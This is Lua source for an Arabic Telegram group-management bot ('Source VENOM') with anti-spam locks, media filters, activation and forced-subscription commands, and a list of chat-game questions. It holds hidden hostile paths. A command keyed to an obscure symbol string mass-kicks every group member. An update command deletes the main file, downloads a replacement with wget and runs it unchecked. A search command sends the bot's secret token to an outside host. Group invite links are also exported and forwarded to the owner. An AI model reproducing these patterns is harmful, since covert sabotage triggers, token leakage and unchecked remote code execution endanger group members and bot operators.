DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageContact' and not Special(msg) then      
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Special(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " 𖥔 عذرا  ↚ {[@"..data.username_.."]}\n 𖥔 عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

------------------------------------------------------------------------

------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," 𖥔 عذرا  ↚ {[@"..data.username_.."]}\n 𖥔 عذرا تم منع الصوره \n" ) 
else
send(msg.chat_id_,0," 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 عذرا تم منع الصوره \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," 𖥔 عذرا  ↚ {[@"..data.username_.."]}\n 𖥔 عذرا تم منع المتحركه \n") 
else
send(msg.chat_id_,0," 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 عذرا تم منع المتحركه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
-------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------
if text == 'تفعيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔لا تستطيع استخدام البوت \n 𖥔 يرجى الاشتراك بالقناه اولا \n 𖥔 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not Devban(msg) then
send(msg.chat_id_, msg.id_,' 𖥔عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖥔 الـجـروب مـفعـل مـن قبـل')
else
sendText(msg.chat_id_,'\n 𖥔 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖥔تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' 𖥔 تـم تـشغـيل الـبوت فـي الـجـروب جـديد\n'..
'\n 𖥔بواسطة {「'..Name..'」}'..
'\n 𖥔ايدي الجروب {'..IdChat..'}'..
'\n 𖥔اسم الجروب {['..NameChat..']}'..
'\n 𖥔عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n 𖥔الرابط {['..LinkGp..']}'
if not Devban(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تعطيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔لا تستطيع استخدام البوت \n 𖥔 يرجى الاشتراك بالقناه اولا \n 𖥔 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖥔 الـبوت مـعطـل مـن قبـل')
else
sendText(msg.chat_id_,'\n 𖥔 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖥔 تـم تـعـطيل الـبوت   {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '\n تـم تـعـطيل الـبوت مـن الـجـروب 𖥔'..
'\n 𖥔بواسطة {「'..Name..'」}'..
'\n 𖥔ايدي الجروب {'..IdChat..'}'..
'\n 𖥔اسم الجروب {['..NameChat..']}'..
'\n 𖥔الرابط {['..LinkGp..']}'
if not Devban(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and not Sudo(msg) and not database:get(bot_id..'Free:Bots') then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔لا تستطيع استخدام البوت \n 𖥔 يرجى الاشتراك بالقناه اولا \n 𖥔 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not Devban(msg) then
send(msg.chat_id_, msg.id_,' 𖥔عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'مشرف'
end
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖥔تـم تـشغـيل الـبوت فـي الـجـروب ')
else
sendText(msg.chat_id_,'\n 𖥔 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖥔تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
database:sadd(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' 𖥔 تـم تـشغـيل الـبوت فـي الـجـروب جـديد\n'..
'\n 𖥔بواسطة {「'..Name..'」}'..
'\n 𖥔موقعه في الجروب {'..AddPy..'}' ..
'\n 𖥔ايدي الجروب {'..IdChat..'}'..
'\n 𖥔عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n 𖥔اسم الجروب {['..NameChat..']}'..
'\n 𖥔الرابط {['..LinkGp..']}'
if not Devban(msg) then
sendText(SUDO,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end
if text ==("تفعيل") and Sudo(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_," ") 
else
send(msg.chat_id_, msg.id_,"𖥔 تمت ترقيه ❮ "..num2.." ❯ من الادمنيه") 
end
end,nil)   
end
if text and text:match("^ضع عدد الاعضاء (%d+)$") and Devban(msg) then
local Num = text:match("ضع عدد الاعضاء (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,' 𖥔 تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end

if text == 'تحديث السورس' and Devban(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
os.execute('rm -rf VENOM.lua')
os.execute('wget https://raw.githubusercontent.com/VENOM197/Venom/main/VENOM.lua')
send(msg.chat_id_, msg.id_,' 𖥔 تم تحديث السورس')
dofile('VENOM.lua')  
end

if text and text:match("^تغير الاشتراك$") and Devban(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 𖥔 حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and Devban(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 𖥔 حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "مسح رساله الاشتراك " and Devban(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " 𖥔 تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك 𖥔$") and Devban(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 𖥔 حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري" and Devban(msg) then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_," 𖥔 الاشتراك الاجباري مفعل \n 𖥔 على القناة  ↚ ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," 𖥔 اهلا عزيزي المطور \n 𖥔 ارسل الان معرف قناتك")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" and Devban(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " 𖥔 تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري " and Devban(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " 𖥔 تم تفعيل الاشتراك الاجباري \n 𖥔 على القناة  ↚ ["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, " 𖥔 لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
if text == "++-+++" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 تم تفعيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "+-+-+-+-+&--" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' 𖥔 تم تعطيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
if text == "حاله الالعاب" and Constructor(msg) then
local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الالعاب هي : {"..MRSoOoFi.."}\nاذا كانت {✔} الالعاب مفعله\nاذا كانت {✖} الالعاب معطله")
end
function bnnaGet(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end

if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
local Text = [[
┏━━━━━━•⊱𖥔⊰•━━━━━━━┓
𖢜 [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙴𝙽𝙾𝙼](t.me/SOURCEVENOM)⇣
𖢜 [𝙱𝙰𝙽𝙳𝙰](t.me/QSVNO)ঌ
𖢜 [𝙰𝙷𝙼𝙴𝙳](t.me/AY_AHD)ঌ
𖢜 [𝙳𝙴𝚅𝙸𝙳](t.me/de_vi_d)ঌ
𖢜 [𝙱𝙾𝙽𝙶𝙾𝙻](t.me/de_vi_d)ঌ
𖢜 [𝙲𝙷 𝚅𝙴𝙽𝙾𝙼](t.me/SOURCEVENOM)ঌ
┗━━━━━━•⊱𖥔⊰•━━━━━━━┛
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𖥔 مــطــور الــبــوت 𖥔', url="http://t.me/"..sudos.UserName}},
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'دونجول' or text == "دونجل" then
local msg_id = msg.id_/2097152/0.5
local Text = [[
 المبرمج دونجول
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 ˹ＤＯＮＧＯＬ¹˼ 𓌺 ',url="t.me/UU_DO_N"}},}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UU_DO_N&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'ديفيد' or text == 'دفيد' then
local Text = [[
{ المبرمج ديفيد } ↓

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹ＤＥＶＩＤ༈˼',url="t.me/de_vi_d"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/de_vi_d&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'أحمد' or text == 'احمد' or text == 'احمد عياد' then
local Text = [[
المبرمج احمد عياد للتواصل مع
اتبع الازرار إلي في الاسفل↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹𖢜 𝗔𝗛𝗠𝗘𝗗 ⤶˼',url="t.me/AY_AHD"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AY_AHD&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'باندا' or text == 'Banda' or text == 'banda' then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ ᴘᴀɴᴅᴀ
 ᴛᴏ ᴄᴏᴍᴍụɴɪᴄᴀᴛᴇ ᴛᴏɢᴇᴛʜᴇʀ, 
ғᴏʟʟᴏᴡ ᴛʜᴇ ʙụᴛᴛᴏɴѕ ʟᴏᴡᴇʀ 𝅘𝅥𝅯 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹ʙᴀɴᴅᴀ ғᴜᴄᴋ σғғ↺˼',url="t.me/Q_0_ll"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text and text:match('^بحث (.*)$') and not database:get(bot_id..'dw:bot:api'..msg.chat_id_) then            
local Text = text:match('^بحث (.*)$') 
local msgin = msg.id_/2097152/0.5 
http.request('http://devstorm.ml/tshake/tahaj200.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Text)..'&msg='..msgin)
end
if text == 'يوتيوب' or text == 'بحث' or text == 'اليوتيوب' then
local Text = [[
اليك بوتات تحميل 🛑
من جميع المواقع 🛑

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بوت اليوتيوب 🇲🇦',url="t.me/Qeaa_bot"}},
{{text = 'بوت تيك توك 𖥔',url="t.me/K0XBOT"}},
{{text = 'بوت انستقرام 🎌',url="t.me/J33Bot"}},
{{text = 'بوت قران 🏳️',url="t.me/quran_lbot"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SUDOsv(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل الان اذاعتك؟ \n 𖥔 للخروج ارسل الغاء ")
return false
end
if text == "£¢€$$__€€¢¥^^¥€" and SUDOsv(msg) then
if AddChannel(msg.sender_user_id_) == false then

return false
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
},function(ta,VENOM)
local t = "\nツ قائمة الاعضاء \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ \n"
x = 0
local list = VENOM.members_
for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,v.user_id_)
end
end
 
end,nil)
end
if text == "استوري" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(4,74); 
local Text ='اكتب  وسيتم البوت باختيار استوري عشوائي' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qapplu/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "كتبات بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(3,49); 
local Text ='✨🌻' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/dfk9apa/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "تويت" or text == "كت تويت" then 
local TWEET_Msg = { 
"مرتبط؟ ", 
" هل بتكراش ع حد في حياتك؟", 
" ينفع نرتبط؟", 
" ممكن توريني صوره بتحبها؟", 
" ممكن نبقي صحااب ع الفيس؟", 
" هل لسه بتحب الاكس؟", 
"عندك كام اكس في حياتك؟ ", 
"ينفع تبعتلي رقمك؟ ", 
" ما تيجي اعزمني ع حاجه بحبها؟", 
"ينفع احضنك؟ ", 
"قولي ع اكبر غلطه ندمان عليهاا؟ ", 
"عندك كام سنه؟ ", 
" عامل بلوك لكام واحد عندك؟", 
" قولي سر محدش يعرفه؟", 
" عندك كام اكس في حياتك؟", 
"بتعرف تقلش وتهزر؟ ", 
" لونك المفضل هو؟", 
" مين أقرب حد ليك الفتره دي ؟", 
" قولي ع اكبر غلطه ندمان عليهاا؟", 
" مين مغنيك المفضل؟", 
" حابب تبقي اي في المستقبل؟", 
"راضي عن حياتك بنسبه كام؟ ", 
"اكتر حاجه بتلفت انتباهك في البنت او الولد؟ ", 
"اي رأيك في صوره البروفايل بتاعتي؟ ", 
" هل باين عليا اني شخص لطيف؟", 
" توافق ترجع للاكس؟", 
"ممكن تضحي بحياتك لمين؟ ", 
"سافرت بلاد برا مصر واي هي؟ ", 
" اي رأيك في صوره البروفايل بتاعتي؟", 
" هل بتعتبر نفسك حلو وبتحب شكلك؟", 
" نفسك تزور انهي بلد في العالم؟", 
" شخصيه ع السوشيال شايف انها مميزه؟", 
"عندك فوبيا من اي؟ ", 
" ممكن تورينا لينك الصراحه؟", 
"عمرك عيطت ع حاجه؟ ", 
" شايف اي أسوأ صفه فيك؟", 
"هل شلت مواد قبل كد وعدت السنه؟ ", 
"بتغير ع الل بتحبهم وبيبان عليك لو غيرت؟ ", 
"معاك كام فلوس دلوقتي؟ ", 
" بتفضل صحابك البنات ولا الولاد؟", 
" مسامح الل ظلمك؟", 
" ممثلك الافضل؟", 
" ممكن تقول رساله لحد مش هيشوفها؟", 
"انت اهلاوي ولا زملكاوي؟ ", 
" اي حيوانك المفضل؟", 
"اخر افلام شاهدتها", 
"بتعرف تكلم لغه تانيه واي هي؟ ", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس فينوم؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليه باندا جدع؟ ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس فينوم؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس فينوم؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" آخر مره ضربت عشره كانت متى ؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
